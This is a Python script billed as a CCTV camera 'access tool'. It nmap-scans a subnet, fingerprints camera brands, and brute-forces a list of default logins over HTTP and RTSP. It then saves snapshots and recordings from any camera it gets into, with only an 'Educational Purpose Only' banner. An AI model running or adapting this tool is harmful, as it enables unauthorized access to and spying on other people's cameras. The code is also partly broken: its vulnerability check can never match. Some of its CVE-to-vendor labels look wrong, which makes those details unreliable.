#!/usr/bin/env python3
"""
GAUTAM CCTV Scanner v2.0
Complete CCTV Camera Discovery & Access Tool
"""

import subprocess
import socket
import requests
import json
import time
import threading
from datetime import datetime
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors for terminal
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'

# Default CCTV Credentials Database
DEFAULT_CREDS = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '12345'),
    ('admin', '123456'),
    ('admin', 'root'),
    ('root', 'root'),
    ('admin', ''),
    ('user', 'user'),
    ('guest', 'guest'),
    ('admin', 'admin123'),
    ('admin', 'password123'),
    ('admin', 'changeme'),
    ('admin', '123456789'),
    ('admin', 'qwerty'),
    ('admin', 'abc123'),
    ('admin', '111111'),
    ('admin', '000000'),
    ('root', 'admin'),
    ('root', 'password'),
    ('user', 'password'),
    ('admin', 'Admin'),
    ('admin', 'Admin123'),
    ('admin', 'administrator'),
    ('administrator', ''),
    ('administrator', 'admin'),
    ('administrator', 'password'),
]

# Known CCTV Brands
CCTV_BRANDS = {
    'Hikvision': ['/ISAPI/System/deviceInfo', 'hikvision', 'Hik-Connect'],
    'Dahua': ['/cgi-bin/magicBox.cgi?action=getSystemInfo', 'dahua', 'Dahua'],
    'Axis': ['/axis-cgi/param.cgi?action=list', 'axis', 'AXIS'],
    'TP-Link': ['/cgi-bin/configMan.cgi', 'tp-link', 'TP-Link'],
    'Ubiquiti': ['/api/v2.0/system/info', 'ubnt', 'Ubiquiti'],
    'Reolink': ['/cgi-bin/api.cgi?cmd=GetDevInfo', 'reolink', 'Reolink'],
    'Amcrest': ['/cgi-bin/system.cgi?action=system', 'amcrest', 'Amcrest'],
    'Foscam': ['/get_status.cgi', 'foscam', 'Foscam'],
    'Zavio': ['/cgi-bin/system.cgi', 'zavio', 'Zavio'],
    'Vivotek': ['/cgi-bin/system/getSystemInfo.cgi', 'vivotek', 'Vivotek'],
}

# Known Vulnerabilities
VULNERABILITIES = {
    'CVE-2021-36260': {
        'severity': 'CRITICAL',
        'cvss': 9.8,
        'description': 'Hikvision RCE - Command Injection'
    },
    'CVE-2018-9995': {
        'severity': 'HIGH',
        'cvss': 8.1,
        'description': 'Dahua Authentication Bypass'
    },
    'CVE-2016-20016': {
        'severity': 'HIGH',
        'cvss': 7.5,
        'description': 'TP-Link Camera Auth Bypass'
    },
    'CVE-2020-5754': {
        'severity': 'HIGH',
        'cvss': 7.8,
        'description': 'Axis Camera RCE'
    }
}

class CCTVScanner:
    def __init__(self):
        self.found_cameras = []
        self.lock = threading.Lock()
        self.threads = []

    def print_banner(self):
        """Print GAUTAM banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        try:
            with open('banner.txt', 'r') as f:
                print(RED + f.read() + RESET)
        except:
            print(RED + "📸 GAUTAM CCTV ACCESS TOOL" + RESET)
        print(f"\n{CYAN}[+] Starting CCTV Scanner...{RESET}")
        print(f"{YELLOW}[!] Educational Purpose Only{RESET}\n")

    def scan_network(self, subnet='192.168.1.0/24'):
        """Scan network for CCTV cameras using Nmap"""
        print(f"{BLUE}[*] Scanning network: {subnet}{RESET}")
        
        result = subprocess.run(
            ['nmap', '-sS', '-p', '80,443,554,8554,8080,8888,8081,8082,37777,37778,9000',
             '--open', '-T4', subnet],
            capture_output=True, text=True, timeout=120
        )
        
        devices = []
        current = None
        
        for line in result.stdout.split('\n'):
            if 'Nmap scan report for' in line:
                if current:
                    devices.append(current)
                ip = line.split('for')[1].strip().split(' ')[0]
                current = {'ip': ip, 'ports': []}
            elif '/tcp' in line and 'open' in line:
                port = line.split('/tcp')[0].strip()
                if current:
                    current['ports'].append(port)
        
        if current:
            devices.append(current)
        
        print(f"{GREEN}[+] Found {len(devices)} devices with open ports{RESET}")
        return devices

    def identify_camera(self, ip, port=80):
        """Identify camera brand and model"""
        for brand, paths in CCTV_BRANDS.items():
            for path in paths:
                try:
                    url = f"http://{ip}:{port}{path}"
                    response = requests.get(url, timeout=3, verify=False)
                    if response.status_code == 200:
                        if brand.lower() in response.text.lower():
                            return brand
                except:
                    pass
        return 'Unknown'

    def check_rtsp(self, ip):
        """Check if RTSP stream is accessible"""
        rtsp_urls = [
            f"rtsp://{ip}:554",
            f"rtsp://{ip}:8554",
            f"rtsp://{ip}:554/stream1",
            f"rtsp://{ip}:554/Streaming/Channels/101",
            f"rtsp://{ip}:554/ch1/main/av_stream"
        ]
        
        for url in rtsp_urls:
            try:
                result = subprocess.run(
                    ['ffprobe', '-i', url, '-t', '2'],
                    capture_output=True, timeout=5
                )
                if 'Stream' in str(result.stderr):
                    return url
            except:
                pass
        return None

    def try_default_credentials(self, ip, port=80):
        """Try default credentials on camera"""
        found_creds = []
        
        for username, password in DEFAULT_CREDS:
            try:
                url = f"http://{ip}:{port}"
                response = requests.get(url, auth=(username, password), timeout=2)
                if response.status_code == 200:
                    found_creds.append(f"{username}:{password}")
                    break
            except:
                pass
            
            # Try RTSP auth
            try:
                rtsp_url = f"rtsp://{username}:{password}@{ip}:554"
                result = subprocess.run(
                    ['ffprobe', '-i', rtsp_url, '-t', '1'],
                    capture_output=True, timeout=3
                )
                if 'Stream' in str(result.stderr):
                    found_creds.append(f"RTSP: {username}:{password}")
                    break
            except:
                pass
        
        return found_creds

    def check_vulnerabilities(self, ip, brand):
        """Check for known vulnerabilities"""
        found = []
        for cve_id, details in VULNERABILITIES.items():
            for affected in details.get('affected', []):
                if brand in affected or affected == 'All':
                    found.append({
                        'cve': cve_id,
                        'severity': details['severity'],
                        'cvss': details['cvss'],
                        'description': details['description']
                    })
        return found

    def take_snapshot(self, ip, port=80, creds=None):
        """Take snapshot from camera"""
        try:
            if creds:
                username, password = creds.split(':')
                url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi"
                response = requests.get(url, auth=(username, password), timeout=5)
                if response.status_code == 200:
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"snapshot_{ip}_{timestamp}.jpg"
                    with open(filename, 'wb') as f:
                        f.write(response.content)
                    return filename
        except:
            pass
        
        # Try RTSP snapshot
        try:
            url = f"rtsp://{ip}:554/stream1"
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"snapshot_{ip}_{timestamp}.jpg"
            subprocess.run(
                ['ffmpeg', '-i', url, '-vframes', '1', '-y', filename],
                capture_output=True, timeout=10
            )
            return filename
        except:
            pass
        return None

    def access_web_interface(self, ip, port=80):
        """Open camera web interface in browser"""
        url = f"http://{ip}:{port}"
        subprocess.run(['firefox', url])
        return url

    def record_stream(self, ip, duration=30):
        """Record RTSP stream"""
        rtsp_url = f"rtsp://{ip}:554/stream1"
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"recording_{ip}_{timestamp}.mp4"
        
        try:
            subprocess.run(
                ['ffmpeg', '-i', rtsp_url, '-t', str(duration), '-c', 'copy', '-y', filename],
                capture_output=True, timeout=duration+10
            )
            return filename
        except:
            return None

    def run(self, subnet='192.168.1.0/24'):
        """Main scanner function"""
        self.print_banner()
        
        # Scan network
        devices = self.scan_network(subnet)
        
        if not devices:
            print(f"{RED}❌ No devices found{RESET}")
            return
        
        print(f"\n{BLUE}📸 SCANNING CAMERAS...{RESET}\n")
        print("="*60)
        
        camera_count = 0
        
        for device in devices:
            ip = device['ip']
            ports = device['ports']
            
            print(f"\n{YELLOW}[+] Device: {ip}{RESET}")
            print(f"    Ports: {', '.join(ports)}")
            
            # Identify brand
            brand = 'Unknown'
            for port in ports:
                if port in ['80', '443', '8080', '8888']:
                    brand = self.identify_camera(ip, int(port))
                    if brand != 'Unknown':
                        break
            
            print(f"    Brand: {brand}")
            
            # Check if camera
            is_camera = False
            for port in ['554', '8554', '37777']:
                if port in ports:
                    is_camera = True
                    break
            
            if not is_camera and brand == 'Unknown':
                print(f"    {YELLOW}⚠️ Not a camera{RESET}")
                continue
            
            camera_count += 1
            
            # Check RTSP
            rtsp_url = self.check_rtsp(ip)
            if rtsp_url:
                print(f"    {GREEN}✅ RTSP Accessible: {rtsp_url}{RESET}")
            
            # Try credentials
            for port in ports:
                if port in ['80', '443', '8080', '8888']:
                    creds = self.try_default_credentials(ip, int(port))
                    if creds:
                        print(f"    {GREEN}✅ Credentials Found: {', '.join(creds)}{RESET}")
                        break
            
            # Check vulnerabilities
            vulns = self.check_vulnerabilities(ip, brand)
            if vulns:
                for vuln in vulns:
                    print(f"    {RED}⚠️ {vuln['cve']}: {vuln['description']}{RESET}")
            
            # Take snapshot
            snapshot = self.take_snapshot(ip)
            if snapshot:
                print(f"    {GREEN}📸 Snapshot saved: {snapshot}{RESET}")
            
            print(f"    {CYAN}🌐 Web: http://{ip}{RESET}")
            
            # Save to list
            device_info = {
                'ip': ip,
                'ports': ports,
                'brand': brand,
                'rtsp': rtsp_url,
                'credentials': creds if creds else [],
                'vulnerabilities': vulns,
                'snapshot': snapshot
            }
            self.found_cameras.append(device_info)
        
        print("\n" + "="*60)
        print(f"\n{GREEN}✅ Scan Complete! Found {camera_count} cameras{RESET}\n")
        
        # Save results
        self.save_results()
        return self.found_cameras

    def save_results(self):
        """Save scan results to file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        with open(f'cctv_scan_{timestamp}.json', 'w') as f:
            json.dump(self.found_cameras, f, indent=2)
        
        print(f"{GREEN}📊 Results saved to cctv_scan_{timestamp}.json{RESET}")

    def interactive_menu(self):
        """Show interactive menu for found cameras"""
        if not self.found_cameras:
            print(f"{RED}❌ No cameras found. Run scan first!{RESET}")
            return
        
        print(f"\n{BLUE}📸 FOUND CAMERAS:{RESET}")
        print("="*50)
        
        for i, camera in enumerate(self.found_cameras):
            print(f"{i+1}. {camera['ip']} - {camera['brand']}")
            if camera.get('rtsp'):
                print(f"   📡 RTSP: {camera['rtsp']}")
            if camera.get('credentials'):
                print(f"   🔑 Creds: {', '.join(camera['credentials'])}")
        
        print("\n" + "="*50)
        print(f"{GREEN}✅ Total: {len(self.found_cameras)} cameras{RESET}")

if __name__ == '__main__':
    import sys
    import os
    
    scanner = CCTVScanner()
    
    subnet = sys.argv[1] if len(sys.argv) > 1 else '192.168.1.0/24'
    
    try:
        scanner.run(subnet)
        scanner.interactive_menu()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}⚠️ Scan interrupted by user{RESET}")
    except Exception as e:
        print(f"{RED}❌ Error: {e}{RESET}")

